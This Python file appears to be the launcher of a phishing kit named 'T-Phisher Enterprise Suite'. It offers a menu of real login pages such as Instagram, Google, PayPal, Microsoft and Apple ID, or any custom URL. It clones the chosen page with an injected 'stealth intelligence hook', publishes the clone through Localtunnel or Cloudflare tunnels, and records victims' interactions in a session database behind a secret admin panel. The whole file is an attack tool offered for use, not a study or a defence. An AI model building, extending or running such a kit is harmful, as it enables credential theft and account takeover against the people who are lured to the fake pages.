import os
import sys
import socket
import datetime
import uvicorn
from colorama import init, Fore, Style

from core.cloner import clone_target
from utils.tunnel import start_tunnel
from database.models import init_db
import core.server as server_module

init(autoreset=True)


POPULAR_TARGETS = {
    "1": ("Instagram Login", "https://www.instagram.com/accounts/login/"),
    "2": ("Facebook Login", "https://www.facebook.com/login/"),
    "3": ("Google Sign-In", "https://accounts.google.com/"),
    "4": ("Twitter / X Login", "https://twitter.com/i/flow/login"),
    "5": ("GitHub Login", "https://github.com/login"),
    "6": ("LinkedIn Login", "https://www.linkedin.com/login"),
    "7": ("Microsoft Login", "https://login.live.com/"),
    "8": ("Netflix Login", "https://www.netflix.com/login"),
    "9": ("PayPal Login", "https://www.paypal.com/signin"),
    "10": ("Snapchat Login", "https://accounts.snapchat.com/"),
    "11": ("Discord Login", "https://discord.com/login"),
    "12": ("Amazon Sign-In", "https://www.amazon.com/ap/signin"),
    "13": ("Apple ID Login", "https://appleid.apple.com/"),
    "14": ("Telegram Web", "https://web.telegram.org/"),
    "15": ("WhatsApp Web", "https://web.whatsapp.com/")
}

def find_free_port(start_port=8000):
    port = start_port
    while port < 65535:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", port))
                return port
            except OSError:
                port += 1
    return start_port

def main():
    print(f"{Fore.RED}==========================================")
    print(f"{Fore.YELLOW}       T-PHISHER ENTERPRISE SUITE         ")
    print(f"{Fore.RED}==========================================")
    
    print(f"\n{Fore.CYAN}[?] Select Target Category / Website:")
    print(f"  {Fore.GREEN}0. Enter Manual Custom URL (Any website)")
    
    
    for key, (name, url) in POPULAR_TARGETS.items():
        print(f"  {Fore.YELLOW}{key}. {Fore.WHITE}{name}")
        
    choice = input(f"\n{Fore.CYAN}Enter your choice [0-{len(POPULAR_TARGETS)}]: {Style.RESET_ALL}").strip()
    
    if choice in POPULAR_TARGETS:
        target_name, target_url = POPULAR_TARGETS[choice]
        print(f"{Fore.GREEN}[+] Selected Target: {target_name} ({target_url})")
    else:
        target_url = input(f"{Fore.CYAN}[?] Enter custom target URL: {Style.RESET_ALL}").strip()
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        print(f"{Fore.GREEN}[+] Selected Custom Target: {target_url}")
        
    print(f"\n{Fore.CYAN}[?] Select Tunnel Provider:")
    print(f"  {Fore.GREEN}1. Localtunnel")
    print(f"  {Fore.GREEN}2. Cloudflare Tunnels (Recommended)")
    tunnel_choice = input(f"{Fore.CYAN}Enter choice [1/2] (default 2): {Style.RESET_ALL}").strip()
    provider = "localtunnel" if tunnel_choice == "1" else "cloudflare"
    
    session_id = f"session_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    db_name = f"tphisher_{session_id}.db"
    
    SessionLocal, db_path = init_db(db_name)
    
    server_module.CURRENT_SESSION_ID = session_id
    server_module.SESSION_DB = SessionLocal
    server_module.TARGET_URL = target_url
    
    output_path = os.path.join("templates", "cloned.html")
    
    print(f"\n{Fore.YELLOW}[*] Cloning target page & injecting stealth intelligence hook...")
    if clone_target(target_url, output_path):
        print(f"{Fore.GREEN}[+] Page cloned successfully with dynamic hooks!")
    else:
        print(f"{Fore.RED}[-] Failed to clone target page. Check URL or network.")
        return

    port = find_free_port(8000)
    print(f"{Fore.YELLOW}[*] Launching local engine on port {port}...")
    
    tunnel_url = start_tunnel(port, provider)
    
    print(f"\n{Fore.GREEN}[+] LOCAL TESTING LINK    : {Style.BRIGHT}http://localhost:{port}")
    if tunnel_url:
        print(f"{Fore.GREEN}[+] TARGET TRACKING LINK  : {Style.BRIGHT}{tunnel_url}")
    
    admin_url = f"http://localhost:{port}/admin/{server_module.ADMIN_SECRET_TOKEN}"
    print(f"{Fore.GREEN}[+] SECURE ADMIN PANEL    : {Style.BRIGHT}{admin_url}")
    print(f"{Fore.YELLOW}    (Note: Unique secure token generated for this session){Style.RESET_ALL}\n")
    
    print(f"{Fore.MAGENTA}[*] Waiting for target interaction... (Live hits & intel will stream below)\n{Style.RESET_ALL}")
    
    try:
        uvicorn.run("core.server:app", host="0.0.0.0", port=port, log_level="warning")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] T-Phisher session terminated safely. History saved in sessions/{db_name}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()